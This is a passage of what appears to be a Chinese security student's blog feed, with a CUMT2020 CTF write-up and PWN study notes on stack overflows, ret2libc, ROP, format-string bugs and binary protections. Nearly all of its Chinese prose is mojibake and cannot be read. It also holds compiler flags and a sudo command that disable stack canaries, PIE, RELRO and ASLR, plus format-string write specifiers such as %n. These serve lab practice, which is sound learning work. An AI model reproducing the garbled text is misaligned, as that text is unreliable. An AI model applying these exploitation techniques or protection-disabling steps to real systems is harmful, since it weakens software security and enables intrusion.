title="MISCç­¾åˆ°é¢˜"></a>MISCç­¾åˆ°é¢˜</h3><p>ookè§£ç </p><h3 id="åŒé‡æ´—è„‘"><a href="#åŒé‡æ´—è„‘" class="headerlink" title="åŒé‡æ´—è„‘"></a>åŒé‡æ´—è„‘</h3><p>ä¸ä½›è®ºç¦…+ç¤¾ä¼šä¸»ä¹‰ä»·å€¼è§‚</p><h3 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h3><p>åŠ qqæ‹ä¸€æ‹</p><h3 id="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"><a href="#çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†" class="headerlink" title="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"></a>çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†</h3><p>è„±è¿›010ï¼Œç›´æ¥ç›²æ–‡è§£å¯†</p><h3 id="7çš„æ„å¿—ï¼"><a href="#7çš„æ„å¿—ï¼" class="headerlink" title="7çš„æ„å¿—ï¼"></a>7çš„æ„å¿—ï¼</h3><p>å‹ç¼©åŒ…å¯†ç 7</p><p>æ …æ åŠ å‡¯æ’’</p><h3 id="å¥‡æ€ªçš„é¢˜"><a href="#å¥‡æ€ªçš„é¢˜" class="headerlink" title="å¥‡æ€ªçš„é¢˜"></a>å¥‡æ€ªçš„é¢˜</h3><p>æ”¹åƒç´ å¯ä»¥å¾—åˆ°ä¸€å¼ æ•£å¼€çš„äºŒç»´ç </p><p>æŠŠä¸‰ä¸ªæ‹¼ä¸€ä¸ªäºŒç»´ç </p><p>è¡¥ä¸‰ä¸ªå®šä½ç¬¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMT2020å…¥é—¨èµ›&quot;&gt;&lt;a href=&quot;#CUMT2020å…¥é—¨èµ›&quot; class=&quot;headerlink&quot; title=&quot;CUMT2020å…¥é—¨èµ›&quot;&gt;&lt;/a&gt;CUMT2020å…¥é—¨èµ›&lt;/h1&gt;&lt;p&gt;æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>0dayå®‰å…¨è¯»ä¹¦ç¬”è®°</title>
    <link href="https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T14:29:36.000Z</published>
    <updated>2020-11-20T14:17:51.878Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–°</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–°&lt;/p&gt;
&lt;h1 id=&quot;æ­£æ–‡&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°</title>
    <link href="https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T08:09:08.000Z</published>
    <updated>2020-11-20T14:20:02.585Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§&lt;/p&gt;
&lt;h1 id=&quot;æ­£æ–‡&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="é€†å‘" scheme="https://pz1o.top/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="é€†å‘" scheme="https://pz1o.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="è¯»ä¹¦ç¬”è®°" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PWNå­¦ä¹ </title>
    <link href="https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/"/>
    <id>https://pz1o.top/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-24T14:32:31.000Z</published>
    <updated>2020-11-22T15:15:57.106Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>çº¯é›¶åŸºç¡€ï¼Œå¤§ä½¬è¯·ç•¥è¿‡</p><p>ä»é›¶å¼€å§‹å­¦ä¹ PWN,Webä¼šå»å­¦ï¼Œä½†å¯èƒ½ç°åœ¨å¤§éƒ¨åˆ†æ—¶é—´ä¼šç”¨åœ¨PWNä¸Šï¼Œå¦‚æœéœ€è¦é¢˜çš„è¯å¯ä»¥è¯„è®º</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p><p>å¤§å­¦ä¸­æ˜¯ç ”ç©¶æ·±åº¦è¿˜æ˜¯å¹¿åº¦ï¼Œæˆ‘å¯èƒ½è¿˜æ˜¯éœ€è¦é€‰æ‹©ä¸€ä¸‹</p><p>åŸºæœ¬å…¨æ˜¯pptæˆªå›¾</p><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.c #ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶</span><br><span class="line">file a.s #æŸ¥çœ‹æ–‡ä»¶ç±»å‹  å¯ä»¥çœ‹è§æ˜¯asciiæ–‡æœ¬</span><br><span class="line">gcc a.s  #ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">file a.out #å¯ä»¥çœ‹è§æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p><h2 id="ELFæ–‡ä»¶"><a href="#ELFæ–‡ä»¶" class="headerlink" title="ELFæ–‡ä»¶"></a>ELFæ–‡ä»¶</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p><h2 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p><h2 id="ç¨‹åºç¼–è¯‘ä¸é“¾æ¥"><a href="#ç¨‹åºç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="ç¨‹åºç¼–è¯‘ä¸é“¾æ¥"></a>ç¨‹åºç¼–è¯‘ä¸é“¾æ¥</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p><h2 id="ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ"><a href="#ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ" class="headerlink" title="ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ"></a>ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p><h2 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p><h1 id="æ ˆæº¢å‡ºåŸºç¡€"><a href="#æ ˆæº¢å‡ºåŸºç¡€" class="headerlink" title="æ ˆæº¢å‡ºåŸºç¡€"></a>æ ˆæº¢å‡ºåŸºç¡€</h1><h2 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a><strong>åŸºæœ¬åŸç†</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a><strong>å®ä¾‹</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p><h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a><strong>æ”»å‡»</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>è¿”å›åœ°å€ä¸ºåé—¨åœ°å€</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>è¿”å›åœ°å€ä¸ºå†™å…¥çš„shellcodeçš„åœ°å€</p><p><strong>æ ˆä¸­å†™å…¥shellcode</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p><p><strong>bssæ®µå†™å…¥shellcode</strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p><h1 id="è¿”å›å¯¼å‘ç¼–ç¨‹"><a href="#è¿”å›å¯¼å‘ç¼–ç¨‹" class="headerlink" title="è¿”å›å¯¼å‘ç¼–ç¨‹"></a>è¿”å›å¯¼å‘ç¼–ç¨‹</h1><h2 id="åŸºç¡€-1"><a href="#åŸºç¡€-1" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p><h2 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p><p><strong>è°ƒç”¨æ„é€ </strong></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>å­˜æ”¾å‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­</p><p>ä½†è¶…è¿‡6ä¸ªå°±ä¼šæ”¾å…¥æ ˆä¸­</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p><h1 id="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"><a href="#åŠ¨æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"></a>åŠ¨æ€é“¾æ¥è¿‡ç¨‹</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p><h1 id="ä¿æŠ¤æªæ–½"><a href="#ä¿æŠ¤æªæ–½" class="headerlink" title="ä¿æŠ¤æªæ–½"></a>ä¿æŠ¤æªæ–½</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p><p>å®ƒåˆ†ä¸ºä¸¤ç§ï¼ŒPartial RELRO å’Œ Full RELROï¼Œå³ éƒ¨åˆ†RELRO å’Œ å®Œå…¨RELROã€‚</p><p><strong>éƒ¨åˆ†RELRO</strong> æ˜¯ GCC çš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨ éƒ¨åˆ†RELROã€‚ä½†æ˜¯ä»æ”»å‡»è€…è§’åº¦æ¥çœ‹å‘¢ï¼Œéƒ¨åˆ†RELRO ä¸å ªä¸€å‡»ï¼Œå› ä¸ºå®ƒä»…ä»…ä½¿ GOT å­˜å‚¨åœ¨ bss æ®µä¹‹å‰ï¼Œè¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›– GOTã€‚<br><strong>å®Œå…¨RELRO</strong> ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // å…³é—­ï¼Œå³No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // å…¨éƒ¨å¼€å¯ï¼Œå³Full RELRO</span><br></pre></td></tr></table></figure><h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>ä¸»è¦æ˜¯ä¿æŠ¤æ ˆåŒºä¸å¯æ‰§è¡Œï¼Œé€šå¸¸åœ¨checksecä¸­å¯ä»¥æŸ¥çœ‹</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>åœ°å€éšæœºåŒ–ï¼Œä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ä¸æƒ³è®©ä½ æ‰¾åˆ°çœŸæ­£çš„å†…å­˜åœ°å€</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p><p>æ”¹å˜å€¼çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><strong>ASLR å¹¶ä¸è´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µçš„éšæœºåŒ–ï¼Œè¿™ç”± PIE è´Ÿè´£ï¼Œä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚</strong></p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>è¿™ç§æ ˆä¿æŠ¤æªæ–½åœ¨æ ˆå¸§ä¸­ä»»ä½•å±€éƒ¨ç¼“å†²åŒºä¸æ ˆçŠ¶æ€ä¹‹é—´å­˜å‚¨ä¸€ä¸ªç‰¹æ®Šçš„é‡‘ä¸é›€å€¼</strong>ï¼Œ</p><p>ä¹Ÿç§°å“¨å…µå€¼ï¼Œé€šä¿—ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªcookie</p><p>å®ƒæ˜¯ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éšæœºäº§ç”Ÿçš„ã€‚</p><p>åœ¨æ¢å¤å¯„å­˜å™¨çŠ¶æ€ä¹‹å‰å’Œä»å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç¨‹åºæ£€æŸ¥è¿™ä¸ªé‡‘ä¸é›€å€¼æ˜¯å¦è¢«è¯¥å‡½æ•°çš„æŸä¸ªæ“ä½œæˆ–è€…è¯¥å‡½æ•°è°ƒç”¨çš„æŸä¸ªå‡½æ•°çš„æŸä¸ªæ“ä½œæ”¹å˜äº†ï¼Œå¦‚æœå‘ç°å¼‚å¸¸ç¨‹åºä¼šä¸­æ­¢ã€‚<br>æœ€è¿‘çš„ GCC ç‰ˆæœ¬å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // GCC å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼</span><br><span class="line">gcc -fno-stack-protector -o a a.c //ç¦ç”¨æ ˆä¿æŠ¤</span><br><span class="line">gcc -fstack-protector -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br><span class="line">gcc -fstack-protector-all -o a a.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br></pre></td></tr></table></figure><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>ä½ç½®æ— å…³ä»£ç ï¼Œè´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µbss</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE</span><br></pre></td></tr></table></figure><h1 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h1><p>æ§åˆ¶ESP</p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p><h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><p><strong>å‰æï¼šæœ‰printf ä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§</strong></p><ol><li>æ³„éœ²æ ˆå†…å­˜</li><li>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</li><li>ç¯¡æ”¹æ ˆå†…å­˜</li><li>ç¯¡æ”¹ä»»æ„åœ°å€å†…å­˜</li></ol><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%x</span><br><span class="line">%p æ‰“å°æ ˆä¸Šå†…å®¹</span><br><span class="line">%s æ‰“å°æ ˆä¸Šè§£æåœ°å€çš„å†…å®¹</span><br><span class="line">%n å†™å†…å®¹(æ‰“å°å­—èŠ‚çš„ä¸ªæ•°)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) æ§åˆ¶ç¬¬ä¸‰ä¸ªå‚æ•°</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p><h1 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h1><h2 id="ä»€ä¹ˆæ˜¯å †"><a href="#ä»€ä¹ˆæ˜¯å †" class="headerlink" title="ä»€ä¹ˆæ˜¯å †"></a>ä»€ä¹ˆæ˜¯å †</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" 